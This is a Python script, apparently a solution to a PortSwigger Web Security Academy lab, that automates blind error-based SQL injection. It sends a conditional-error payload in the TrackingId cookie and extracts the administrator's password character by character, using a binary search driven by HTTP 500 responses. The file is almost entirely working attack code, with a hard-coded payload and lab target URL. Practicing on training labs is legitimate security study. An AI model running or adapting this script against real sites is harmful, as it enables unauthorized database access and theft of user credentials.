import asyncio
from typing import Any
import aiohttp
import re
import string
from tqdm import tqdm


SORTED_ASCII_CHARACTERS = sorted(string.digits + string.ascii_letters)


class SqliCommand:

    URI_PATTERN = (
        r"^(?P<scheme>(http|https)?)://(?P<host>[^/:]+)(:(?P<port>\d+))?(?P<path>/.*)?$"
    )

    def __init__(self, uri_path, cookie: str | None = None, db: str | None = None) -> None:
        """
        SQLi Command class that hendles the parameters of SQL injection.

        :param uri_path: Target URI path.
        :param cookie: Session cookie if it's needed. 
        :param db: Database. For now it's supported only the MySQL.
        """
        self._uri_path = uri_path
        self._cookie = cookie
        self._db = db
        self._scheme: str
        self._host: str
        self._port: int | None
        self._path: str

        self._parse_uri()

    def _parse_uri(self) -> None:
        """
        URI parsing

        :raises ValueError: Raises if URL is invalid.
        """
        match = re.match(self.URI_PATTERN, self._uri_path)

        if not match:
            raise ValueError(f"Invalid URI format: {self._uri_path}")

        self._scheme = match.group("scheme")
        self._host = match.group("host")
        self._port = int(match.group("port")) if match.group("port") else None
        self._path = match.group("path") or "/"

    @property
    def base_uri(self) -> str:
        base_uri_ = f"{self._scheme}://{self._host}"
        return f"{base_uri_}:{self._port}" if self._port else base_uri_

    @property
    def uri_path(self) -> str:
        return f"{self._uri_path}"

    def _build_headers(self) -> dict[str, str]:
        headers = {}

        if self._cookie:
            headers["Cookie"] = self._cookie

        return headers

    async def send_get(self, timeout: int = 10) -> aiohttp.ClientResponse:
        async with aiohttp.ClientSession(
            headers=self._build_headers()
        ) as session_:
            return await self._get(session_, timeout)

    async def send_post(self, data: dict[str, str], timeout: int = 10) -> aiohttp.ClientResponse:
        async with aiohttp.ClientSession(
            headers=self._build_headers()
        ) as session:
            return await self._post(session, data, timeout)

    async def _get(self, session: aiohttp.ClientSession, timeout: int = 10):
        async with session.get(
            self.uri_path,
            timeout=timeout
        ) as response:
            await response.read()
            return response

    async def _post(self, session: aiohttp.ClientSession, data: dict[str, str], timeout: int = 10):
        async with session.get(
            self.uri_path,
            data=data,
            timeout=timeout
        ) as response:
            await response.read()
            return response


async def main() -> None:
    result_string = await find_password_by_binay_search(SORTED_ASCII_CHARACTERS, 30)

    print(f"Password found: {result_string}")


async def _try_discover_char(password_position: int, expression: str) -> dict[Any]:

    def create_payload(expression: str) -> str:
        payload = (
            "TrackingId=ytzd2l86XUfBPDcY' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' "
            f"END FROM users WHERE username='administrator' AND SUBSTR(password,{password_position},1)"
            f" {expression})='a; "
            "session=Xsa7r9ZPnyZ2FtP5UUUicakimC4ALune"
        )
        return payload

    sqli_command = SqliCommand(
        "https://0a3d00830466451280ba26eb00ef002f.web-security-academy.net/login",
        create_payload(expression),
    )
    response = await sqli_command.send_get()

    discovered = True if response.status == 500 else False
    return {
        "status_code": response.status,
        "discovered": discovered,
        "response": response,
    }


async def find_password_by_binay_search(search_space: list[str], password_len: int) -> str:
    """
    Discover a password using a binary search strategy in a oracle-based injection pattern.

    The search is performed character-by-character, and progress is reported.

    The algorithm assumes:
    - The password length is known in advance.
    - The target system leaks comparison results through observable responses
      (status codes, timing differences, etc.).
    - Each character position can be tested independently.


    :param search_space:
        Ordered list of candidate characters to be tested. The list MUST be
        sorted, as binary search relies on ordering guarantees.
    :param password_len:
        Expected length of the password to be discovered.
    """
    result_string = ""

    with tqdm(total=password_len) as pbar:
        for pass_idx in tqdm(range(1, password_len + 1)):
            result_char, last_found = await binary_search_finder(search_space, pass_idx)
            result_string += result_char
            await asyncio.sleep(0.05)
            if last_found is True:
                pbar.update(password_len - pass_idx)
                break
            pbar.update(1)
    return result_string


async def binary_search_finder(search_space: list[str], pass_idx: int) -> tuple[str, bool]:
    left = 0
    right = len(search_space) - 1
    last_found = False
    while left <= right:
        half = left + (right - left) // 2
        current_char = search_space[half]
        eq_expression = f"= '{current_char}'"
        le_expression = f"<= '{current_char}'"
        gt_expression = f"> '{current_char}'"
        result_dict = await _try_discover_char(pass_idx, eq_expression)
        if result_dict["status_code"] == 500:
            break

        result_dict = await _try_discover_char(pass_idx, le_expression)
        if result_dict["status_code"] == 500:
            right = half
            continue
        
        result_dict = await _try_discover_char(pass_idx, gt_expression)
        if result_dict["status_code"] == 500:
            left = half + 1
            continue

        last_found = True
        current_char = ""
        break
    return current_char, last_found
     


if __name__ == "__main__":
    asyncio.run(main(), debug=True)